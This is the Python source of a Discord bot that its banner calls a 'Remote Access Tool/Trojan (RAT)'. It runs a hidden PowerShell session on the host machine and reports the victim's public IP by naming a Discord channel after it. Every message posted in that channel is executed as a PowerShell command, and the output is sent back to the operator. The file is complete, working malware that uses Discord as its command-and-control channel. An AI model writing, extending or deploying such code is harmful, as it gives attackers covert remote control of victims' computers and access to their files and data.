import discord
import requests
import subprocess

DISCORD_TOKEN = "PLACE_DISCORD_BOT_TOKEN_HERE"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    
    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """
    
    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())
    return "\n".join(output)

@client.event
async def on_ready():
    global channel
    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
    channel = await guild.create_text_channel("Computer: " + ip)
   
    ascii_art = r"""

    ................................................:::-:.................... . --:.....................
    ..........:::::...........::::::::::--======.##########.======---------==.. ===:-:..................
    ====-:-----=============================##########.##=.. ================.. ===-----:::::...........
    ======================================############..#=    ===============.. ==.=====================
    ====================================############....#.    ===============.. ==.=====================
    =================================##############  #.        ==============.. ========================
    ==============================.  ############=   #.         =============#. ========================
    ================================.     ###.#.#.  #.           ============.. ========================
    =================================       .#..#  ..             ===========.. ========================
    =================================         ..                  ==========-##.========================
    =================================@          .                  =========.#  ========================
    ==================================.         .                    =======..   =======================
    ===================================#         .      #.            ======@.   =======================
    ======-============================@         #    #.   ##.         ======.  ========================
    ==..##..#######............=========#         .  .  #####....       -=.==    =.=====================
    ==..######@###########################        . ##### ##....         =  =   ##==#..######........===
    ==..###=@=@###########################       ####.##.   .               .   #@.##################===
    ==..###===#############################     #=#######=  .:                  =. .#############===@===
    ==..###=################################    ######     .                    = =####..#######====*@==
    ==..###.################################    .    = ==  =-                      .############=====@==
    *=..###=#@##############################            =  =                       =-###########========
    @=..###=##.#############################     #.# ..   .=                        ############====@===
    @=..###=###############################*    ### #.                             .############====@===
    @=..###=##.############################.    ### #. .                            #################===
    @=..###=##=############################=   @.# #.  .                             ################===
    @=..###=##################################### ##=                                ##############=#===
    @=..###=###############.=########@######  #.###..                               .###########@====@@@
    @=..###=############..## .## ######      ####                                    ###########%====..:
    ....###=##@@#######.......  #####   #   ##= #= =                                 .##########-.### ..
    ....##############..     . :#=#..       #. =                                       ...--:...........
    .. .############. ..      # .####-       =.-  =                                    ##.....:.........
    ..........###.  ....      .###.### #- ##  =                                      = #####.#=.........
    .............. .#......   . ####### #####.                                         .#....... ... ...
    ............############   #. .#.   .==                                           .. .....##........
    ...#########.##########:  #   ...  .                                               .#.+..-#..#......
    ####################..  .#.     .  .                                              ...:.#............
            
    
                ████████╗██╗  ██╗███████╗      ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗██████╗ 
                ╚══██╔══╝██║  ██║██╔════╝      ██╔══██╗ ╚════██╗██║  ██║██╔══██╗██╔════╝██╔══██╗
                   ██║   ███████║█████╗ █████╗ ██████╔╝  █████╔╝███████║██████╔╝█████╗  ██████╔╝
                   ██║   ██╔══██║██╔══╝ ╚════╝ ██╔══██╗  ╚═══██╗╚════██║██╔═══╝ ██╔══╝  ██╔═██╗
                   ██║   ██║  ██║███████╗      ██║   ██║██████╔╝     ██║██║     ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚══════╝      ╚═╝   ╚═╝╚═════╝      ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                    
                                    Discord Remote Access Tool/Trojan (RAT)
                                            Created by: The-R34per
                                                
                                 GitHub: https://github.com/The-R34per
                   Website: https://the-r34per.github.io/The-R34per-Website/index.html                                               
                                               
    -----------------------------------------------------------------------------------------------------
    Basic Commands:
    
    ls = list current directory
    cd <directory> = change directory
    echo <message> = says <message> back to user
    
    "shutdown" = terminates this session
    
    -----------------------------------------------------------------------------------------------------
    Examples:
    
    "cd Destop"
    This changes your directory to user's desktop
    ---
    "echo "Hello World" > hello.txt" 
    This creates a file called "hello.txt" in the current directory with the text "Hello World"

"""

    chunks = [ascii_art[i:i+1900] for i in range(0, len(ascii_art), 1900)]
    for part in chunks:
        await channel.send(f"```\n{part}\n```")

@client.event
async def on_message(message):
    if not channel or message.channel.id != channel.id:
        return

    if message.author.bot:
        return
    
    result = execute_cmd(message.content) or f"Executed \"{message.content}\" with no output."
    
    if message.content.lower() == "shutdown":
        await message.channel.send("RAT Bot is shutting down...")
        await client.close()
        return
    
    while True:
        await message.channel.send(result[:2000])
        if len(result) < 2000:
            break
        result = result[2000:]
        
client.run(DISCORD_TOKEN)
